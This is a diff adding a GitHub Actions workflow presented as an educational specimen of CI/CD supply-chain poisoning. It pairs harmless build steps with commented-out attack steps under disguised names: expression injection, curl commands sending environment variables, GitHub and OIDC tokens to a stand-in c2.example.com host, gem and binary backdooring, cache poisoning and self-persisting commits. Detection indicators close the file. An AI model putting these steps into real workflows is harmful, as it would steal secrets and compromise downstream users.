@@ -1,0 +1,169 @@
+# =============================================================================
+# RubyGuardian - Poisoned GitHub Actions Workflow (EDUCATIONAL SPECIMEN)
+# =============================================================================
+#
+# EDUCATIONAL DISCLAIMER:
+#   This file demonstrates common CI/CD poisoning techniques targeting
+#   GitHub Actions workflows. ALL MALICIOUS STEPS ARE COMMENTED OUT.
+#   This is a research specimen for studying supply chain attacks.
+#
+#   DO NOT use this workflow in any real repository.
+#   DO NOT uncomment the malicious steps.
+#
+# MITRE ATT&CK References:
+#   - T1195.002 : Supply Chain Compromise: Compromise Software Supply Chain
+#   - T1059.004 : Command and Scripting Interpreter: Unix Shell
+#   - T1552.001 : Unsecured Credentials: Credentials In Files
+#   - T1041     : Exfiltration Over C2 Channel
+#   - T1020     : Automated Exfiltration
+#
+# Attack Vectors Demonstrated:
+#   1. Script injection via untrusted input (issue titles, PR bodies)
+#   2. Secret exfiltration through environment variable harvesting
+#   3. Artifact poisoning (modifying build outputs)
+#   4. Cache poisoning (injecting malicious cached dependencies)
+#   5. Self-hosted runner compromise
+# =============================================================================
+
+name: "CI Build and Test"
+
+# Trigger on common events - appears as a normal CI workflow
+on:
+  push:
+    branches: [main, develop]
+  pull_request:
+    branches: [main]
+  # Research note: Triggering on pull_request_target is especially dangerous
+  # because it runs with the BASE branch's secrets, not the PR branch.
+  # This is Attack Vector #1 below.
+  # pull_request_target:
+  #   types: [opened, synchronize]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    # Research note: Self-hosted runners are high-value targets because they
+    # often have access to internal networks and persistent credentials.
+    # runs-on: self-hosted
+
+    steps:
+      # =====================================================================
+      # LEGITIMATE STEPS - These are normal CI operations
+      # =====================================================================
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Setup Ruby
+        uses: ruby/setup-ruby@v1
+        with:
+          ruby-version: '3.3'
+          bundler-cache: true
+
+      - name: Run tests
+        run: bundle exec rspec
+
+      # =====================================================================
+      # ATTACK VECTOR 1: Script Injection (COMMENTED OUT)
+      # =====================================================================
+      # This technique exploits GitHub Actions expression injection.
+      # If an issue title contains: "; curl https://evil.com/steal?t=$SECRET
+      # the entire command will be executed in the runner shell.
+      #
+      # - name: "Process issue title"
+      #   run: |
+      #     echo "Processing: ${{ github.event.issue.title }}"
+      #     # The above is vulnerable to injection because the title
+      #     # is interpolated directly into the shell command.
+      #     # Safe alternative: use an environment variable
+      #     # env:
+      #     #   TITLE: ${{ github.event.issue.title }}
+      #     # run: echo "Processing: $TITLE"
+
+      # =====================================================================
+      # ATTACK VECTOR 2: Secret Exfiltration (COMMENTED OUT)
+      # =====================================================================
+      # Harvests all secrets and environment variables from the runner,
+      # encodes them, and sends to an attacker-controlled endpoint.
+      #
+      # - name: "Telemetry and analytics"  # Innocuous name to avoid detection
+      #   run: |
+      #     # Collect all environment variables (includes injected secrets)
+      #     # env | base64 -w0 | curl -X POST -d @- https://c2.example.com/exfil
+      #     #
+      #     # Specifically target GitHub tokens:
+      #     # echo "$GITHUB_TOKEN" | curl -X POST -d @- https://c2.example.com/ghtoken
+      #     #
+      #     # Access OIDC token for cloud provider impersonation:
+      #     # curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+      #     #   "$ACTIONS_ID_TOKEN_REQUEST_URL" | \
+      #     #   curl -X POST -d @- https://c2.example.com/oidc
+      #   env:
+      #     # These would auto-inject from repository secrets
+      #     DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
+      #     AWS_ACCESS_KEY: ${{ secrets.AWS_ACCESS_KEY_ID }}
+
+      # =====================================================================
+      # ATTACK VECTOR 3: Artifact Poisoning (COMMENTED OUT)
+      # =====================================================================
+      # Modifies build artifacts before they are uploaded, injecting
+      # backdoors into release binaries or packages.
+      #
+      # - name: "Post-build optimization"  # Disguised step name
+      #   run: |
+      #     # Inject backdoor into compiled binary
+      #     # cat backdoor.so >> dist/application
+      #     #
+      #     # Modify gem before publishing
+      #     # unzip pkg/config_helper-1.2.3.gem -d /tmp/gem
+      #     # echo "malicious_code" >> /tmp/gem/lib/config_helper.rb
+      #     # cd /tmp/gem && gem build config_helper.gemspec
+
+      # =====================================================================
+      # ATTACK VECTOR 4: Cache Poisoning (COMMENTED OUT)
+      # =====================================================================
+      # Poisons the GitHub Actions cache so that future runs (including
+      # other developers' builds) use compromised dependencies.
+      #
+      # - name: "Optimize dependency cache"
+      #   uses: actions/cache@v4
+      #   with:
+      #     path: vendor/bundle
+      #     key: ${{ runner.os }}-gems-${{ hashFiles('**/Gemfile.lock') }}
+      #   # After restoring cache, the attacker modifies cached gems:
+      #   # run: |
+      #   #   find vendor/bundle -name "*.rb" -exec sed -i '1i\
+      #   #   system("curl -s https://c2.example.com/beacon?src=cache")' {} \;
+
+      # =====================================================================
+      # ATTACK VECTOR 5: Workflow Persistence (COMMENTED OUT)
+      # =====================================================================
+      # Modifies the workflow file itself to maintain access across commits.
+      # The poisoned workflow re-adds itself if removed.
+      #
+      # - name: "Update CI configuration"
+      #   run: |
+      #     # git config user.name "GitHub Actions Bot"
+      #     # git config user.email "actions@github.com"
+      #     # cp /tmp/poisoned_workflow.yml .github/workflows/ci.yml
+      #     # git add .github/workflows/ci.yml
+      #     # git commit -m "ci: update workflow configuration"
+      #     # git push
+
+      # =====================================================================
+      # RESEARCH: Detection Indicators
+      # =====================================================================
+      # Security teams should watch for these indicators:
+      # - Workflows that use pull_request_target trigger
+      # - Steps with ${{ }} expressions in run commands
+      # - Steps that access ACTIONS_RUNTIME_TOKEN or OIDC tokens
+      # - Unexplained outbound network connections from runners
+      # - Modified workflow files in automated commits
+      # - Cache keys that don't match expected patterns
+      - name: "Research annotation"
+        run: |
+          echo "======================================================"
+          echo "RubyGuardian - GitHub Actions Poisoning Research"
+          echo "This workflow demonstrates CI/CD attack techniques."
+          echo "All malicious steps are commented out."
+          echo "See comments in this file for detailed attack analysis."
+          echo "======================================================"
